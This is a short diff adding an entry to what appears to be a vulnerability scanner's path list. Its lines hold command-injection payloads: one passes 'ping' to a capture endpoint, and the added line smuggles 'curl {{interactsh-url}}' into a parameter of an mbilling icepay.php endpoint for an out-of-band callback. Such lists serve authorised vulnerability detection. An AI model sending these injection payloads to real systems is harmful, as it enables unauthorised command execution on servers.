@@ -97,3 +97,4 @@
 /config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=ping%20{{interactsh-url}}%20index.pcap
 /jmx-console/
 /api/health
+/mbilling/lib/icepay/icepay.php?democ={{randstr}};curl%20{{interactsh-url}};%23
